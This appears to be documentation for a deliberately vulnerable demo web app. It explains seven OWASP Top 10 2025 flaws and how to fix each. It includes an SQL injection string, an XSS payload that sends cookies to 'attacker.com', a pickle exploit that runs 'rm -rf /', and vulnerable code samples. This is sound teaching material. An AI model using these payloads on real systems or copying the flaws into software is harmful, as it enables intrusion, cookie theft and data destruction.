# Vulnerabilities Demonstrated

This document details the intentional vulnerabilities in the demo-devsecops application and how to identify them using OWASP Top 10 2025.

---

## V1: SQL Injection

### Location
`app/app.py` - User login function

### Vulnerability Description
User input is directly concatenated into SQL queries without parameterization.

### Code Example
```python
username = request.args.get('username')
password = request.args.get('password')
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# ^ VULNERABLE: allows SQL injection
```

### Attack Example
```
Username: ' OR '1'='1
Password: anything
Result: Logs in without password
```

### How Bandit Detects It
Bandit flags string formatting in SQL queries as B608 (hardcoded SQL).

### Remediation
```python
# SECURE: Use parameterized queries
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

### OWASP Top 10 2025
**A05:2025 – Injection**

### Severity
**CRITICAL**

---

## V2: Cross-Site Scripting (XSS)

### Location
`app/app.py` - User profile display

### Vulnerability Description
User input is rendered directly in HTML without sanitization or encoding.

### Code Example
```python
user_comment = request.args.get('comment')
return f"<h1>Comment: {user_comment}</h1>"
# ^ VULNERABLE: allows XSS injection
```

### Attack Example
```html
<script>alert('XSS')</script>
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
```

### How Manual Testing Detects It
1. Enter `<script>alert('XSS')</script>` in comment field
2. If JavaScript alert appears, XSS is confirmed

### Remediation
```python
from markupsafe import escape
return f"<h1>Comment: {escape(user_comment)}</h1>"
```

### OWASP Top 10 2025
**A05:2025 – Injection**

### Severity
**CRITICAL**

---

## V3: Broken Access Control

### Location
`app/app.py` - Authorization checks

### Vulnerability Description
Missing proper access control checks. Users can access resources they shouldn't.

### Vulnerability Details
- No role-based access control (RBAC)
- Direct object references (IDOR)
- Missing authorization checks on sensitive endpoints
- No session validation on protected routes
- Privilege escalation possible

### Code Example
```python
# VULNERABLE: No authorization check
@app.route('/admin/users/<user_id>/delete')
def delete_user(user_id):
    # No check if current user is admin!
    db.delete_user(user_id)
    return "User deleted"

# VULNERABLE: Direct Object Reference
@app.route('/profile/<user_id>')
def view_profile(user_id):
    # Any user can view any other user's profile
    return db.get_user(user_id)
```

### Attack Example
1. Access `/profile/2` to view other users' profiles
2. Access `/admin/users/1/delete` to delete users without being admin
3. Modify user_id parameter to access unauthorized data

### How Testing Detects It
1. Login as regular user
2. Try to access `/admin/*` endpoints
3. Try IDOR: `/profile/1`, `/profile/2`, `/profile/3`
4. Attempt privilege escalation

### Remediation
```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_admin:
            return "Access denied", 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/users/<user_id>/delete')
@admin_required
def delete_user(user_id):
    # Now protected by authorization check
    db.delete_user(user_id)
    return "User deleted"
```

### OWASP Top 10 2025
**A01:2025 – Broken Access Control**

### Severity
**CRITICAL**

---

## V4: Cryptographic Failures

### Location
`app/app.py` - Password hashing and encryption

### Vulnerability Description
Uses weak or outdated cryptographic algorithms and no encryption for sensitive data.

### Code Example
```python
import hashlib

# VULNERABLE: MD5 is cryptographically broken
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# VULNERABLE: Plaintext storage
password_stored = password  # No encryption!
```

### Issues
- MD5 and SHA1 are broken algorithms
- No salt used in hashing
- Plaintext password storage
- Hardcoded encryption keys in code
- Weak random number generation
- Secrets in version control

### Remediation
```python
from argon2 import PasswordHasher
from cryptography.fernet import Fernet

# SECURE: Use Argon2 for passwords
ph = PasswordHasher()
hashed_password = ph.hash(password)

# SECURE: Use Fernet for sensitive data encryption
cipher = Fernet(key)
encrypted_data = cipher.encrypt(sensitive_data)
```

### How Bandit Detects It
- B324: Probable use of insecure hash functions (MD5, SHA1)
- B105: Hardcoded passwords or secrets
- B303: Use of insecure MD2, MD4, MD5, or SHA functions

### OWASP Top 10 2025
**A04:2025 – Cryptographic Failures**

### Severity
**CRITICAL**

---

## V5: Insecure Authentication

### Location
`app/app.py` - Session and authentication management

### Vulnerability Description
Weak authentication mechanisms and session management vulnerabilities.

### Vulnerability Details
- Session tokens are predictable
- No rate limiting on login attempts
- No account lockout after failed attempts
- No password complexity requirements
- No multi-factor authentication (MFA)
- Passwords sent in plaintext (HTTP)
- No CSRF protection on login

### Code Example
```python
# VULNERABLE: Predictable session tokens
import time
session_token = str(int(time.time()))
session[username] = session_token

# VULNERABLE: No rate limiting
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # No check for brute force attempts
    if check_credentials(username, password):
        return "Login successful"
```

### Attack Example
1. Brute force login attempts (no rate limiting)
2. Guess session tokens based on timestamp
3. Session fixation attacks
4. Credential stuffing attacks

### Remediation
```python
import secrets
from flask_limiter import Limiter

limiter = Limiter(app)

# SECURE: Use cryptographically random tokens
session_token = secrets.token_urlsafe(32)

# SECURE: Add rate limiting
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if check_credentials(username, password):
        return "Login successful"
```

### OWASP Top 10 2025
**A07:2025 – Authentication Failures**

### Severity
**CRITICAL**

---

## V6: Security Misconfiguration

### Location
`app/app.py` - HTTP headers and server configuration

### Vulnerability Description
Missing security headers and improper security configuration.

### Missing Security Headers
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

### Code Example
```python
# VULNERABLE: No security headers configured
@app.route('/profile')
def profile():
    return render_template('profile.html')
    # Missing all security headers!

# VULNERABLE: Debug mode enabled in production
app.run(debug=True)  # Exposes sensitive info!
```

### Configuration Issues
- Debug mode enabled in production
- Default credentials not changed
- Unnecessary services exposed
- Outdated dependencies
- No HTTPS enforcement
- Directory listing enabled
- Verbose error messages

### Attack Example
1. Clickjacking attacks (no X-Frame-Options)
2. MIME type sniffing attacks
3. XSS attacks (no CSP)
4. Information leakage via debug pages
5. Man-in-the-middle attacks (no HSTS)

### Remediation
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

# SECURE: Disable debug in production
app.run(debug=False)
```

### How Testing Detects It
- OWASP ZAP security header scanner
- Burp Suite header analysis
- Online header checkers (securityheaders.com)
- Manual header inspection via curl

### OWASP Top 10 2025
**A02:2025 – Security Misconfiguration**

### Severity
**HIGH**

---

## V7: Software or Data Integrity Failures

### Location
`app/app.py` - Deserialization and data handling

### Vulnerability Description
Untrusted data deserialized without validation, allowing arbitrary code execution.

### Code Example
```python
import pickle

# VULNERABLE: Unpickling untrusted data
@app.route('/load_session')
def load_session():
    user_data = pickle.loads(request.cookies.get('session'))
    # Attacker can execute arbitrary Python code!
    return str(user_data)

# VULNERABLE: No integrity checking
data_from_user = request.form.get('data')
process_data(data_from_user)  # No validation!
```

### Attack Example
Pickle allows arbitrary Python code execution during deserialization:

```python
import os
import pickle

# Attacker creates malicious pickle object
class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

malicious_pickle = pickle.dumps(Exploit())
# Send as cookie → Code executes on unpickle
```

### Remediation
```python
import json
import hmac
import hashlib

# SECURE: Use JSON with integrity checking
def create_signed_data(data, secret):
    json_data = json.dumps(data)
    signature = hmac.new(secret.encode(), json_data.encode(), hashlib.sha256).hexdigest()
    return f"{json_data}.{signature}"

def verify_signed_data(signed_data, secret):
    data, signature = signed_data.rsplit('.', 1)
    expected_sig = hmac.new(secret.encode(), data.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError("Data integrity check failed")
    return json.loads(data)

@app.route('/load_session')
def load_session():
    user_data = verify_signed_data(request.cookies.get('session'), app.secret_key)
    return str(user_data)
```

### OWASP Top 10 2025
**A08:2025 – Software or Data Integrity Failures**

### Severity
**CRITICAL**

---

## Summary Table

| ID | Vulnerability | Severity | Detection | OWASP 2025 |
|----|---|---|---|---|
| V1 | SQL Injection | CRITICAL | Bandit, Manual | A05 – Injection |
| V2 | XSS | CRITICAL | Manual, ZAP | A05 – Injection |
| V3 | Broken Access Control | CRITICAL | Manual, ZAP | A01 – Broken Access Control |
| V4 | Cryptographic Failures | CRITICAL | Bandit, Code Review | A04 – Cryptographic Failures |
| V5 | Insecure Authentication | CRITICAL | Manual, ZAP | A07 – Authentication Failures |
| V6 | Security Misconfiguration | HIGH | ZAP, Manual | A02 – Security Misconfiguration |
| V7 | Data Integrity Failures | CRITICAL | Code Review, Bandit | A08 – Software/Data Integrity |

---

## OWASP Top 10 2025 Coverage

This project demonstrates vulnerabilities across multiple OWASP 2025 categories:

- **A01:2025 – Broken Access Control** (V3)
- **A02:2025 – Security Misconfiguration** (V6)
- **A04:2025 – Cryptographic Failures** (V4)
- **A05:2025 – Injection** (V1, V2)
- **A07:2025 – Authentication Failures** (V5)
- **A08:2025 – Software or Data Integrity Failures** (V7)

---

## How to Test Locally

### 1. Run Bandit SAST Scan
```bash
bandit -r app/ -f json -o bandit-report.json
```

### 2. Check for Vulnerable Dependencies
```bash
safety check --json > safety-report.json
```

### 3. Manual Testing in Browser
```bash
# Start the app
python app.py

# Test SQL Injection
curl "http://localhost:5000/login?username=' OR '1'='1&password=anything"

# Test XSS
curl "http://localhost:5000/profile?comment=<script>alert('XSS')</script>"

# Test Broken Access Control
curl "http://localhost:5000/admin/users/1/delete"
```

### 4. Run OWASP ZAP Scan
```bash
zaproxy -cmd -quickurl http://localhost:5000 -quickout zap-report.html
```

---

## Remediation Priority (2025)

1. **CRITICAL (Address First):**
   - V1: SQL Injection (A05:2025)
   - V2: XSS (A05:2025)
   - V3: Broken Access Control (A01:2025)
   - V4: Cryptographic Failures (A04:2025)
   - V5: Insecure Authentication (A07:2025)
   - V7: Data Integrity Failures (A08:2025)

2. **HIGH (Address Soon):**
   - V6: Security Misconfiguration (A02:2025)

---

## References

- OWASP Top 10 2025: https://owasp.org/Top10/2025/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE Top 25: https://cwe.mitre.org/top25/
- OWASP API Security: https://owasp.org/www-project-api-security/

---

**Last Updated:** June 2026 | **OWASP Version:** 2025 | **Status:** Active Development
